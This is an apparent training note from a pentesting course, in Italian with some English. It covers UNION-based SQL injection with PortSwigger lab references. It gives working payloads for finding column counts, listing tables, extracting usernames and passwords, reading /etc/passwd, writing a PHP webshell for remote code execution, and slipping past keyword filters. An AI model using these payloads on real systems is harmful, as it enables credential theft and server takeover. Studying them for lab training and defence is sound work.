# UNION-Based SQLi

**Difficolta:** Intermediate
**Time to Master:** 2.5h
**Prerequisiti:** [02-Error-Based-SQLi.md](02-Error-Based-SQLi.md)
**Lab:** PortSwigger Academy — UNION attacks

---

## Obiettivo

Usare `UNION SELECT` per combinare i risultati della query originale con una query arbitraria, estraendo dati da altre tabelle del database direttamente nella risposta dell'applicazione.

---

## Concetti chiave

### Requisiti per UNION SELECT

1. Stesso numero di colonne della query originale
2. Tipi di dato compatibili colonna per colonna
3. Almeno una colonna deve essere visibile nell'output (stringa) per leggere i dati

---

## Strumenti

| Tool | Comando base | Output | Note |
|------|---------------|--------|------|
| Burp Repeater | payload manuale | dati estratti in pagina | principale |
| sqlmap | `--technique=U --dump` | automatizza extraction | vedi [07-SQLMap-Automation.md](07-SQLMap-Automation.md) |

---

## Payload / Esempi

### Esempio 1: trovare numero colonne e colonna "stampabile"

```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --        -- errore = 2 colonne totali

' UNION SELECT NULL, NULL --
' UNION SELECT NULL, 'test' --   -- vedi dove compare "test" nella pagina, quella e la colonna stampabile
```

### Esempio 2: enumerare tabelle e colonne (information_schema)

```sql
' UNION SELECT table_name, NULL FROM information_schema.tables --
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
```

**Output atteso:**
```
users
products
orders
```

### Esempio 3: estrazione credenziali

```sql
' UNION SELECT username, password FROM users --
' UNION SELECT CONCAT(username, ':', password), NULL FROM users --
' UNION SELECT GROUP_CONCAT(username, ':', password SEPARATOR '\n'), NULL FROM users --
```

**Spiegazione:** `GROUP_CONCAT` restituisce tutte le righe in una singola stringa concatenata, utile quando l'app mostra solo la prima riga del risultato.

### Esempio 4: leggere file dal filesystem (MySQL, con privilegi FILE)

```sql
' UNION SELECT LOAD_FILE('/etc/passwd'), NULL --
```

### Esempio 5: scrivere una webshell su disco (MySQL, con privilegi FILE e secure_file_priv permissivo)

```sql
' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/var/www/html/shell.php' --
```

**Spiegazione:** se riuscita, questa tecnica porta a RCE diretta — richiede privilegi elevati sul DB e `secure_file_priv` non restrittivo, condizioni non sempre presenti ma da provare sempre.

---

## Evasion / Bypass Techniques

### Bypass filtro sulla keyword UNION

```sql
' UNI/**/ON SELECT NULL, NULL --
' /*!50000UNION*/ SELECT NULL, NULL --
' uNiOn SeLeCt NULL, NULL --
```

### Colonne extra quando non conosci il numero esatto

```sql
' UNION SELECT NULL,NULL,NULL,NULL,NULL --   -- prova incrementando finche non sparisce l'errore
```

---

## Lab Hands-On

### Lab 1: PortSwigger — SQL injection UNION attack, retrieving data from other tables
**Obiettivo:** estrarre username/password via UNION
**Difficulty:** Medio
**Time:** 30 min

**Walkthrough breve:**
1. Trova numero di colonne con ORDER BY
2. Identifica colonna stampabile
3. Enumera tabelle/colonne via information_schema
4. Estrai credenziali con UNION SELECT

---

## Common Mistakes

- Dimenticare che i tipi devono essere compatibili -> usa NULL come placeholder universale finche non sai i tipi esatti
- Non provare GROUP_CONCAT quando l'app mostra solo una riga -> perdi dati multipli senza accorgertene

---

## Link Utili

- [PortSwigger — UNION attacks](https://portswigger.net/web-security/sql-injection/union-attacks)

---

## Connessioni

- **Prerequisito:** [02-Error-Based-SQLi.md](02-Error-Based-SQLi.md)
- **Prossimo Step:** [04-Blind-SQLi.md](04-Blind-SQLi.md)
- **Combinazione con:** [08-Exploitation-PostEx/01-File-Upload-Abuse.md](../08-Exploitation-PostEx/01-File-Upload-Abuse.md)

---

## Checklist di padronanza

- [ ] So trovare numero colonne e colonna stampabile
- [ ] So enumerare information_schema per tabelle/colonne
- [ ] So usare GROUP_CONCAT per estrarre righe multiple in un colpo
- [ ] Conosco la tecnica INTO OUTFILE per RCE (anche se raramente sfruttabile)

---

## Note personali

_(spazio libero)_
